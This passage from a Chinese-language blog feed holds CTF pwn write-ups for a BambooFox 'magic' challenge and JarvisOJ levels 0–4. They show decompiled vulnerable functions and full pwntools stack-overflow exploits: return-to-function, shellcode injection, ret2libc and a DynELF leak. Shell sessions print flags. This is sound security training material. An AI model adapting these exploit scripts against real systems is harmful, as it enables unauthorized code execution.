name(a-z): aaaa</span><br><span class="line">Your name is aaaa.</span><br><span class="line">Give me something that you want to MAGIC: 1111111111111111</span><br><span class="line">�'��m��:�ǵ�j#</span><br></pre></td></tr></table></figure><p>IDA反编译结果如下：</p><ul><li><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE v4[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-Fh]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Magic system!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your name(a-z): "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; read(<span class="number">0</span>, &amp;v4[i], <span class="number">1u</span>) &amp;&amp; v4[i] &gt; <span class="number">96</span> &amp;&amp; v4[i] ; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v4[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name is %s.\n"</span>, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me something that you want to MAGIC: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    magic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>never_use</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">never_use</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"sh -i"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>根据代码可以得出，magic的scanf()处存在栈溢出漏洞，而程序中有一个写好了的never_use()可以调用shell，因此思路在于利用栈溢出劫持eip到never_use()处。<br>为了具体实现，需要事先记下never_use()的地址。在IDA中查看：</p><p><img src="https://i.loli.net/2019/02/18/5c6a8a2a8ab42.png" alt="Please wait while loading image." title="addr"></p><p>这里应该是出题人留了个坑，scanf()在读取\x0D的时候会“吃掉”它，因此这里需要修改目标地址为0x08048613，<br>    target_addr = 0x08048613<br>有了目标地址，再回头来看利用。根据IDA中给出的大小</p><p><img src="https://i.loli.net/2019/02/18/5c6a8eb2c93ba.png" alt="Please wait while loading image." title="stack"></p><p>观察s，距离ebp是44h，即68，加上ebp自身的4字节大小，最后得出payload的格式应该为”[72]+target_addr”，而这里出题人还留了个坑，就是do_magic()，这个函数会在magic()返回之前，将用户的输入与随机数做异或运算，这样原本输入的目标地址会被打乱。为了解决这个问题，需要在payload的地址前插入一个\x00，\x00会使strlen()返回，因此在72个随机字符中只要插入一个\x00，后面的部分就不会被do_magic()改变，目标地址也就保存下来了，最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="number">0x08048613</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">71</span> + <span class="string">'\x00'</span> + p32(target_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'The payload is :'</span> + payload</span><br><span class="line"><span class="comment">#sh = process('./magic')</span></span><br><span class="line">sh = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><code>`</code></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-pwn-0~4题解</title>
      <link href="/2019/04/22/JarvisOJ-pwn-0-4/"/>
      <url>/2019/04/22/JarvisOJ-pwn-0-4/</url>
      
        <content type="html"><![CDATA[<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote><p>这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了</p></blockquote><p><code>main</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>vulnerable_function</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显的栈溢出漏洞，buf距离 <code>rbp</code> <code>80h</code>，而<code>read</code>最多可以读<code>200h</code>。<br>同时在程序中还可以发现这个：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -T level0</span><br><span class="line"></span><br><span class="line">level0:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 write</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 system</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 <span class="built_in">read</span></span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 __libc_start_main</span><br><span class="line">0000000000000000  w   D  *UND*0000000000000000              __gmon_start__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -t level0 | grep system</span><br><span class="line">0000000000000000       F *UND*0000000000000000              system@@GLIBC_2.2.5</span><br><span class="line">0000000000400596 g     F .text0000000000000010              callsystem</span><br></pre></td></tr></table></figure><p>可以看到<code>0x400596</code>处有一个<code>callsystem</code>函数，函数反编译如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此构造溢出字符串，使得<code>vulnerable_function</code>返回地址覆盖为<code>callsystem</code>的地址<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line">addr = p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + addr</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</span><br><span class="line">\x96\x05@\x00\x00\x00\x00\x00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><code>main</code>函数与level0一致，<code>vulnerable_function</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>相比level0，题中没有再给出一个可以直接利用的<code>system</code>函数，因此需要自己构造shellcode，并且劫持控制流返回到shellcode处，<code>vulnerable_function</code>会打印出buf的地址，且程序未开启NX保护，因此只需要将shellcode写入buf将<code>vulnerable_function</code>返回地址覆盖为buf中shellcode的位置（为了方便放在buf的开始部分）即可，exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((<span class="number">0x88</span>+<span class="number">4</span>),<span class="string">'A'</span>)</span><br><span class="line">a = sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">payload  += p32(int(a,base = <span class="number">16</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>vulnerable_function</code>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数中出现了<code>system</code>函数，思路为控制<code>read</code>返回到<code>system</code>函数，并且伪造参数，执行<code>system(&quot;/bin/sh&quot;)</code>，在程序中可以找到这个字符串：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /ctf/pwn/jarvis  strings -a -t x ./level2 | grep bin</span><br><span class="line">  1024 /bin/sh</span><br></pre></td></tr></table></figure></p><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys) + p32(<span class="number">0xaaaaaaaa</span>) + p32(elf.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行结果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><p>不会写exp……</p></blockquote><p><code>vulunerable_function</code> :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同样的溢出点，但是这次没有直接给出可利用的代码，题目提供了<code>libc-2.19.so</code>，因此思路是首先控制<code>read</code>返回到<code>write</code>，控制<code>write</code>调用的参数，使其打印出<code>read</code>的got地址对应的值（即<code>read</code>的绝对地址），并使其返回到<code>vulnerable_function</code>，通过<code>write</code>打印得到的<code>read</code>绝对地址，利用绝对地址和在libc中查询到的<code>read</code>的libc地址计算出偏移，从而计算出system的绝对地址，继而构造<code>system(&#39;/bin/sh&#39;)</code>并执行。</p><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = hex(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">read_got = hex(elf.got[<span class="string">'read'</span>])</span><br><span class="line">vuln_addr = hex(elf.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">args = p32(<span class="number">0x01</span>) + p32(int(read_got, <span class="number">16</span>)) + p32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) </span><br><span class="line">payload_leak += p32(int(write_plt, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += p32(int(vuln_addr, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += args</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">re = sh.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> re</span><br><span class="line">read_addr = u32(re)</span><br><span class="line">read_libc = <span class="number">0x000dd3e0</span></span><br><span class="line">offset =  read_addr - read_libc</span><br><span class="line">system_libc = <span class="number">0x00040310</span></span><br><span class="line">exit_libc = <span class="number">0x00033260</span></span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">exit_addr = offset + exit_libc</span><br><span class="line">binsh_addr = offset + <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload :'</span> + payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level3/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">�ck�</span><br><span class="line">payload :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x93a�`�`�L�s�</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote><p>同样不会写exp…</p></blockquote><p>思路与level3大致相同，不过这次没有给出libc，百度了wp才知道需要用到DynELF模块暴力跑出system的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system地址后需要向可执行段写入/bin/sh，因为开启了NX保护，这里选择向bss段写入</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#不断返回到vuln，每次溢出都调用write，伪造参数，打印地址，利用DynELF得到system绝对地址</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read参数，溢出返回到read，并向目标地址（bss段）写入/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#这步结束后，再次返回到vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
